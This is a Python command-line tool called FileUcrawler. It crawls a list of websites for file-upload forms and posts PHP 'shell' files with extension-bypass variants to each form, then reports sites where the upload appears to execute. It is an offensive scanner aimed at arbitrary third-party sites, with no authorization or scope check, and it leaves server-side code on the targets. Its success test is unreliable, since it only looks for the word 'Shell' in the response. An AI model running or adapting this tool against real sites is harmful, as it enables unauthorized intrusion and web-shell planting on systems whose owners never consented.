import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import sys

class FormParser:
    def __init__(self):
        self.file_upload_found = False
        self.file_upload_pages = []

    def parse_forms(self, soup, base_url):
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action')
            if form_action:
                form_action = urljoin(base_url, form_action)
            else:
                form_action = base_url

            inputs = form.find_all('input')
            for input_tag in inputs:
                if input_tag.get('type') == 'file':
                    self.file_upload_found = True
                    self.file_upload_pages.append(form_action)

    def get_file_upload_pages(self):
        return self.file_upload_pages

class FileUploadFinder:
    def __init__(self, url, max_depth=2):
        self.url = url if url.startswith('http') else 'https://' + url
        self.visited_urls = set()
        self.max_depth = max_depth

    def fetch_page(self, url):
        try:
            response = requests.get(url)
            response.raise_for_status()
            return response.text
        except requests.RequestException as e:
            print(f"Error accessing {url}: {e}")
            return None

    def find_file_upload(self, url, depth=0):
        if depth > self.max_depth or url in self.visited_urls:
            return []

        self.visited_urls.add(url)
        page_content = self.fetch_page(url)
        if not page_content:
            return []

        soup = BeautifulSoup(page_content, 'html.parser')
        parser = FormParser()
        parser.parse_forms(soup, url)
        file_upload_pages = parser.get_file_upload_pages()

        if file_upload_pages:
            print(f"\033[93mFile upload found at the following pages for {url}:\033[0m")
            for page in file_upload_pages:
                print(f"  - {page}")
            print()
        else:
            # Recursively search internal links
            internal_links = self.get_internal_links(soup, url)
            for link in internal_links:
                file_upload_pages.extend(self.find_file_upload(link, depth + 1))

        return file_upload_pages

    def get_internal_links(self, soup, base_url):
        internal_links = []
        base_netloc = urlparse(base_url).netloc
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            if urlparse(full_url).netloc == base_netloc:
                internal_links.append(full_url)
        return internal_links

    def test_file_upload(self, form_action):
        files_to_test = {
            'php_shell.php': '<?php echo "Shell"; ?>',
            'php_shell.phtml': '<?php echo "Shell"; ?>',
            'php_shell.php3': '<?php echo "Shell"; ?>',
            'php_shell.php4': '<?php echo "Shell"; ?>',
            'php_shell.php5': '<?php echo "Shell"; ?>',
            'php_shell.php6': '<?php echo "Shell"; ?>',
            'php_shell.pht': '<?php echo "Shell"; ?>',
            'php_shell.pHp': '<?php echo "Shell"; ?>',
            'php_shell.PhP': '<?php echo "Shell"; ?>',
        }

        for filename, content in files_to_test.items():
            files = {'file': (filename, content)}
            try:
                response = requests.post(form_action, files=files)
                if "Shell" in response.text:
                    print(f"\033[91mVulnerability found: {filename} uploaded and executed on {form_action}\033[0m\n")
                    return True
            except Exception as e:
                print(f"Error during file upload test: {e}")

        return False

def print_banner():
    banner = """
███████╗██╗██╗     ███████╗██╗   ██╗ ██████╗██████╗  █████╗ ██╗    ██╗██╗     
██╔════╝██║██║     ██╔════╝██║   ██║██╔════╝██╔══██╗██╔══██╗██║    ██║██║     
█████╗  ██║██║     █████╗  ██║   ██║██║     ██████╔╝███████║██║ █╗ ██║██║     
██╔══╝  ██║██║     ██╔══╝  ██║   ██║██║     ██╔══██╗██╔══██║██║███╗██║██║     
██║     ██║███████╗███████╗╚██████╔╝╚██████╗██║  ██║██║  ██║╚███╔███╔╝███████╗
╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝
                                                                              
                                           
  \033[92mTool by Miftaul Amin\033[0m
"""
    print(banner)

if __name__ == "__main__":
    if len(sys.argv) < 3 or len(sys.argv) > 5:
        print("Usage: python FileUcrawler.py -l <websitelist.txt> [-o <outputfile.txt>]")
        sys.exit(1)

    print_banner()

    output_file = None
    if '-o' in sys.argv:
        output_index = sys.argv.index('-o')
        output_file = sys.argv[output_index + 1]
        sys.argv = sys.argv[:output_index] + sys.argv[output_index + 2:]

    if sys.argv[1] == '-l':
        try:
            with open(sys.argv[2], 'r') as f:
                urls = [line.strip() for line in f.readlines()]

            found_urls = []
            vulnerable_urls = []

            for url in urls:
                print(f"Checking website: {url}")
                finder = FileUploadFinder(url)
                file_upload_pages = finder.find_file_upload(url)

                if file_upload_pages:
                    found_urls.append(url)
                    for action in file_upload_pages:
                        if finder.test_file_upload(action):
                            vulnerable_urls.append(url)
                else:
                    print(f"No file upload form found at {url}\n")

            if output_file:
                with open(output_file, 'w') as f:
                    f.write("Websites with file uploading found:\n")
                    for url in found_urls:
                        f.write(f"{url}\n")
                    f.write("\nWebsites with potential vulnerabilities found:\n")
                    for url in vulnerable_urls:
                        f.write(f"{url}\n")

            print("\n**FileUcrawler**")
            print("Status: Completed")
        except FileNotFoundError:
            print("Error: The file specified does not exist.")
            sys.exit(1)
    else:
        print("Error: Invalid flag. Please use -l <websitelist.txt>")
        sys.exit(1)
